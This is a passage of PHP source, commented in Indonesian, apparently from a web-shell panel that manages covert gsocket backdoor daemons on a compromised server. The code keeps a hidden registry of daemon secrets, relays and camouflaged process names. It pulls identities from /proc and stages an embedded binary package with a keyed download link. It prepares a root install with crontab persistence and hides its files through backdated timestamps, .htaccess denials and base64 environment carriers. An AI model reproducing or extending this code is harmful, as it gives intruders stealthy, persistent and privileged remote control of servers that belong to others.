/* v66.9: registry dibaca & DIGABUNG dari /.cache/.gsp_reg/* milik SEMUA
   kandidat home (bukan hanya gsp_home()) — installer bash bisa menulis ke
   $HOME yang berbeda dari home yang dipakai panel, dan inilah salah satu
   sebab daftar inventaris tampak kosong. Dedupe by _id (basename file):
   bila _id sama muncul di dua home, dipakai entri dengan field non-underscore
   TERBANYAK (paling lengkap). Aksi tindak-lanjut (start1/uninst1/import)
   tetap menulis ke $e['_file'] masing-masing entri.
   v79: sumber baca dilebarkan ke gsp_reg_dirs_read() (fallback panel+/tmp). */
function gsp_registry() {
    $byid = array();
    foreach (gsp_reg_dirs_read() as $gd) {
        $files = @glob($gd . '/*');
        if (!is_array($files)) continue;
        foreach ($files as $f) {
            if (!@is_file($f)) continue;
            $e = array();
            $nf = 0;
            $rows = @file($f);
            if (is_array($rows)) foreach ($rows as $ln) {
                $ln = trim($ln, "\r\n");
                if ($ln === '') continue;
                $kv = explode('=', $ln, 2);
                if (count($kv) === 2) {
                    $e[$kv[0]] = $kv[1];
                    if (substr($kv[0], 0, 1) !== '_') $nf++;
                }
            }
            $e['_id'] = basename($f);
            $e['_file'] = $f;
            $e['_nf'] = $nf;
            if (!isset($byid[$e['_id']]) || $nf > $byid[$e['_id']]['_nf']) $byid[$e['_id']] = $e;
        }
    }
    $out = array();
    foreach ($byid as $e) { unset($e['_nf']); $out[] = $e; }
    return $out;
}

/* ---------- v66.9: helper AUTO-CATAT registry dari proses foreign ----------
   Keluhan lapangan: setelah kill -9 -1 tabel inventaris kosong, padahal
   entri registry harusnya TETAP tampil berstatus 'mati' + tombol 'hidup'
   (hanya 'hapus'/uninst1 yang boleh menghilangkan). Yang hilang: proses
   LAINNYA/foreign tidak pernah tercatat. Tiga helper di bawah: resolve BIN
   baris foreign, pencocokan identitas ke registry, dan penulisan entri
   otomatis (dedupe SECRET/BIN, proteksi tulis sekali per proses unik). */
/* resolve BIN sebuah baris foreign: /proc/<pid>/exe (readlink murni PHP)
   dulu bila ada & is_file; else token path dari cmdline yang is_file;
   else '' (tanpa identitas path) */
function gsp_foreign_bin($frow) {
    $pid = intval(isset($frow['pid']) ? $frow['pid'] : 0);
    if ($pid > 0) {
        $xe = preg_replace('/ \(deleted\)$/', '', strval(@readlink('/proc/' . $pid . '/exe')));
        if ($xe !== '' && @is_file($xe)) return $xe;
    }
    if (isset($frow['cmd']) && preg_match_all('#(/[^\s]+)#', strval($frow['cmd']), $mm)) {
        foreach ($mm[1] as $tok) {
            if (preg_match('#/\.(k|run|gd|sec|rel|log|dat)$#', $tok)) continue;
            if (@is_file($tok)) return $tok;
        }
    }
    return '';
}
/* cocokkan identitas (SECRET non-kosong dulu, else BIN realpath) ke entri
   registry — dipakai auto-catat & render anti-dobel. Return entri / null. */
function gsp_reg_match($entries, $sec, $bin) {
    $sec = trim(strval($sec));
    $bin = strval($bin);
    $brp = ($bin !== '') ? @realpath($bin) : false;
    foreach ((array)$entries as $e) {
        $rs = trim(strval(isset($e['SECRET']) ? $e['SECRET'] : ''));
        if ($sec !== '' && $rs !== '' && $rs === $sec) return $e;
        $rb = strval(isset($e['BIN']) ? $e['BIN'] : '');
        if ($bin !== '' && $rb !== '') {
            if ($rb === $bin) return $e;
            $rp2 = @realpath($rb);
            if ($rp2 !== false && $brp !== false && $rp2 === $brp) return $e;
        }
    }
    return null;
}
/* AUTO-CATAT satu baris foreign ke registry (gsp_home().'/.cache/.gsp_reg').
   Dedupe: skip bila SECRET sama (non-kosong) atau BIN sama (non-kosong)
   sudah ada; skip total bila BIN kosong DAN SECRET kosong (tanpa identitas).
   Format file = key=value per baris, sama seperti entri lain. Gagal tulis
   -> diam (return null). Return entri baru (dengan _id/_file) bila dibuat. */
function gsp_reg_auto_note($frow, &$reg_entries) {
    static $gsp_auto_done = array(); /* proteksi: sekali per proses unik per request */
    $fsec = trim(strval(isset($frow['sec']) ? $frow['sec'] : ''));
    $fbin = gsp_foreign_bin($frow);
    if ($fbin === '' && $fsec === '') return null; /* tidak ada identitas sama sekali */
    if (gsp_reg_match($reg_entries, $fsec, $fbin) !== null) return null; /* sudah tercatat */
    $aid = 'auto_' . substr(md5($fsec . '|' . $fbin . '|' . intval(isset($frow['pid']) ? $frow['pid'] : 0)), 0, 8);
    if (isset($gsp_auto_done[$aid])) return null;
    $gsp_auto_done[$aid] = true;
    $regd = gsp_regdir_w(); /* v79: HOME bisa tidak writable */
    if (@is_file($regd . '/' . $aid)) return null;
    $pid = intval(isset($frow['pid']) ? $frow['pid'] : 0);
    $fcamo = ($pid > 0) ? trim(strval(@file_get_contents('/proc/' . $pid . '/comm'))) : '';
    $frel = (isset($frow['relay']) && $frow['relay'] !== '') ? $frow['relay'] : 'default';
    $frun = '';
    if ($fbin !== '') {
        foreach (array('/.run', '/.gd', '/.gs_run.sh') as $rf) {
            if (@is_file(dirname($fbin) . $rf)) { $frun = dirname($fbin) . $rf; break; }
        }
    }
    $ae = array(
        'TYPE' => 'lainnya', 'BIN' => $fbin,
        'DIR' => ($fbin !== '' ? dirname($fbin) : ''),
        'SECRET' => $fsec, 'RELAY' => $frel, 'CAMO' => $fcamo,
        'RUNNER' => $frun, 'TIME' => date('Y-m-d H:i:s'),
        'AUTO' => '1', 'PID' => strval($pid),
    );
    $regd_ex = @is_dir($regd);
    @mkdir($regd, 0700, true);
    /* registry berisi SECRET — kalau home = docroot, tutup akses web */
    if (!@is_file($regd . '/.htaccess') && @file_put_contents($regd . '/.htaccess', "Require all denied\nDeny from all\n") !== false) gsp_stealth_age($regd . '/.htaccess');
    $txt = '';
    foreach ($ae as $k => $v) $txt .= $k . '=' . $v . "\n";
    if (@file_put_contents($regd . '/' . $aid, $txt) === false) return null; /* gagal tulis -> diam */
    @chmod($regd . '/' . $aid, 0600);
    gsp_stealth_age($regd . '/' . $aid);
    if (!$regd_ex && @is_dir($regd)) gsp_stealth_age($regd);
    $ae['_id'] = $aid;
    $ae['_file'] = $regd . '/' . $aid;
    $reg_entries[] = $ae; /* langsung ikut render & dedupe baris berikutnya */
    return $ae;
}

/* ================= MODUL INSTALL ROOT (baru v68) =================
   Masalah lapangan: daemon gsocket milik ROOT tidak bisa dibaca secret-nya
   oleh panel (www-data) — environ/cmdline root terkunci. Solusi: panel hanya
   MENYIAPKAN paket + one-liner; user sendiri yang menjalankannya di terminal
   ROOT (gsocket root). Script shell yang jalan sebagai root: (1) extract
   binary, (2) start daemon pola installer, (3) tulis .sec CHMOD 0644 (KUNCI
   fitur: panel www-data bisa membaca secret root), (4) menulis entri registry
   LANGSUNG ke registry panel (dir milik www-data — root bisa menulis,
   www-data bisa membaca & menghapus), (5) persistence crontab root #GSPROOT.
   Gaya template: string PHP single-quote TANPA satu pun kutip-tunggal di
   dalam script shell (semua quoting shell pakai double-quote), nilai di-embed
   lewat token @...@ + gsp_sh_sq(). */
/* ---------- ENV-STEALTH: validasi ketat konfig gsocket tambahan ----------
   Input panel (gsip/gsdomain/gssocks/nogreet) -> env GSP_* untuk installer
   (V1/V3/i.sh). Installer membungkus SEMUA konfig ke carrier base64 bernama
   acak (LS_COLORS dsb) sehingga tidak ada plaintext di file runner. Input
   jahat di-drop DI SINI (tidak pernah mencapai shell) + dicatat. */
if (!function_exists('gsp_ok_ipv4')) {
function gsp_ok_ipv4($s) {
    $s = strval($s);
    if (!preg_match('/^\d{1,3}(\.\d{1,3}){3}$/', $s)) return false;
    foreach (explode('.', $s) as $o) { if (intval($o) > 255) return false; }
    return true;
}
/* return array env GSP_* tervalidasi dari $src ($_GET / state installauto);
   yang ditolak dicatat ke $GLOBALS['gsp_envstealth_rej'] */
function gsp_env_stealth_collect($src) {
    if (!is_array($src)) $src = array();
    $out = array(); $rej = array();
    $ip = trim(strval(isset($src['gsip']) ? $src['gsip'] : ''));
    if ($ip !== '') { if (gsp_ok_ipv4($ip)) $out['GSP_GSIP'] = $ip; else $rej[] = 'gsip'; }
    $dom = trim(strval(isset($src['gsdomain']) ? $src['gsdomain'] : ''));
    if ($dom !== '') { if (preg_match('/^[A-Za-z0-9.\-]{1,100}$/', $dom)) $out['GSP_GSDOMAIN'] = $dom; else $rej[] = 'gsdomain'; }
    $sk = trim(strval(isset($src['gssocks']) ? $src['gssocks'] : ''));
    if ($sk !== '') {
        if (preg_match('/^(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})$/', $sk, $m) && gsp_ok_ipv4($m[1]) && intval($m[2]) >= 1 && intval($m[2]) <= 65535) $out['GSP_GSSOCKS'] = $m[1] . ':' . intval($m[2]);
        else $rej[] = 'gssocks';
    }
    if (!empty($src['nogreet']) && strval($src['nogreet']) === '1') $out['GSP_NOGREET'] = '1';
    if (count($rej)) $GLOBALS['gsp_envstealth_rej'] = $rej;
    return $out;
}
/* query-string lanjutan (chaining $ca_qs/$ia_qs/$arh_qs) — dibawa mentah
   (urlencode), validasi ketat tetap terjadi di handler tujuan */
function gsp_env_stealth_qs($src) {
    if (!is_array($src)) return '';
    $qs = '';
    foreach (array('gsip', 'gsdomain', 'gssocks') as $k) {
        if (!empty($src[$k])) $qs .= '&' . $k . '=' . urlencode(trim(strval($src[$k])));
    }
    if (!empty($src['nogreet'])) $qs .= '&nogreet=1';
    return $qs;
}
/* tampilkan catatan penolakan sekali per request (handler streaming) */
function gsp_env_stealth_note() {
    if (empty($GLOBALS['gsp_envstealth_rej'])) return;
    if (function_exists('colorize')) echo colorize('[!] ENV-STEALTH: input DITOLAK validasi ketat & tidak dipakai: ' . implode(', ', $GLOBALS['gsp_envstealth_rej']) . "\n");
    $GLOBALS['gsp_envstealth_rej'] = array();
}
/* prefix "K='v' " aman-shell untuk exec i.sh lewat root channel (rootauto) */
function gsp_env_stealth_prefix($env) {
    $p = '';
    foreach ((array)$env as $k => $v) $p .= $k . '=' . escapeshellarg($v) . ' ';
    return $p;
}
}
/* literal shell aman: bungkus kutip-tunggal (idiom klasik '"'"') */
function gsp_sh_sq($s) {
    return "'" . str_replace("'", "'\"'\"'", strval($s)) . "'";
}
/* entri daemon ROOT? (XROOT=1 dari i.sh, atau TYPE=root) */
function gsp_is_xroot($e) {
    if (!is_array($e)) return false;
    if (!empty($e['XROOT']) && strval($e['XROOT']) === '1') return true;
    if (isset($e['TYPE']) && strval($e['TYPE']) === 'root') return true;
    return false;
}
/* dir registry panel (milik www-data) */
function gsp_root_regdir() { return gsp_regdir_w(); } /* v79: pilih yang writable */
/* secret acak 24 char [A-Za-z0-9] */
function gsp_root_gen_secret() {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $out = '';
    $m = strlen($chars) - 1;
    for ($i = 0; $i < 24; $i++) $out .= $chars[mt_rand(0, $m)];
    return $out;
}
/* id rootN pertama yang belum dipakai di registry panel */
function gsp_root_next_id() {
    $regd = gsp_root_regdir();
    for ($i = 1; $i < 100; $i++) if (!@is_file($regd . '/root' . $i)) return 'root' . $i;
    return 'root' . substr(md5(uniqid(mt_rand(), true)), 0, 6);
}
/* siapkan dir paket gsp_home().'/.cache/.gsr_<10hex>' (0700) — v69: PINDAH
   dari /tmp ke home panel (bug lapangan: PrivateTmp/beda namespace /tmp ->
   shell root menjawab 'No such file'); home panel = satu filesystem yang
   pasti terlihat shell root. Tiap paket membawa: .htaccess deny (home bisa
   saja docroot) + .gsr_ttl epoch (dibaca gsp_gsr_sweep, TTL 30 menit).
   pkg.tgz (binary embedded) ditulis HANYA bila $with_tgz (hemat 1.3MB untuk
   one-liner kill/uninstall). Bila $with_tgz: kunci unduh CARA 2 (32-hex)
   dicatat ke ~/.cache/.gsr_keys (<h>|<key>|<epoch>) dan dikembalikan lewat
   $rkey ('' bila gagal catat -> CARA 2 tidak ditawarkan). */
function gsp_root_pkg($with_tgz, &$err, &$rkey) {
    global $B64_TGZ;
    $err = ''; $rkey = '';
    $base = gsp_home() . '/.cache';
    $h = substr(md5(uniqid(mt_rand(), true)), 0, 10);
    $dir = $base . '/.gsr_' . $h;
    if (!@mkdir($dir, 0700, true)) { $err = 'mkdir gagal: ' . $dir; return ''; }
    @chmod($dir, 0700);
    /* home bisa saja docroot -> tutup akses web ke paket */
    if (!@is_file($dir . '/.htaccess') && @file_put_contents($dir . '/.htaccess', "Require all denied\nDeny from all\n") !== false) gsp_stealth_age($dir . '/.htaccess');
    /* TTL 30 menit — dibaca gsp_gsr_sweep() saat render panel */
    if (@file_put_contents($dir . '/.gsr_ttl', strval(time()) . "\n") !== false) { @chmod($dir . '/.gsr_ttl', 0600); gsp_stealth_age($dir . '/.gsr_ttl'); }
    if ($with_tgz) {
        if (@file_put_contents($dir . '/pkg.tgz', base64_decode($B64_TGZ)) === false) { $err = 'tulis pkg.tgz gagal'; return ''; }
        $rkey = md5(uniqid(mt_rand(), true));
        $kf = $base . '/.gsr_keys';
        if (@file_put_contents($kf, $h . '|' . $rkey . '|' . time() . "\n", FILE_APPEND | LOCK_EX) !== false) {
            @chmod($kf, 0600); gsp_stealth_age($kf);
        } else $rkey = ''; /* gagal catat kunci -> CARA 2 tidak ditawarkan */
    }
    gsp_stealth_age($dir);
    return $dir;
}
/* URL unduh CARA 2 untuk endpoint act=rootpkg. Scheme dari server var HTTPS
   (ditulis jelas di template shell), host+path dari request panel. */
function gsp_root_dlurl($h, $key) {
    $scheme = 'http';
    if (isset($_SERVER['HTTPS']) && strval($_SERVER['HTTPS']) !== '' && strval($_SERVER['HTTPS']) !== 'off') $scheme = 'https';
    $host = isset($_SERVER['HTTP_HOST']) ? strval($_SERVER['HTTP_HOST']) : '';
    if ($host === '' && isset($_SERVER['SERVER_NAME'])) $host = strval($_SERVER['SERVER_NAME']);
    $sn = isset($_SERVER['SCRIPT_NAME']) ? strval($_SERVER['SCRIPT_NAME']) : '';
    return $scheme . '://' . $host . $sn . '?act=rootpkg&h=' . $h . '&k=' . $key;
}
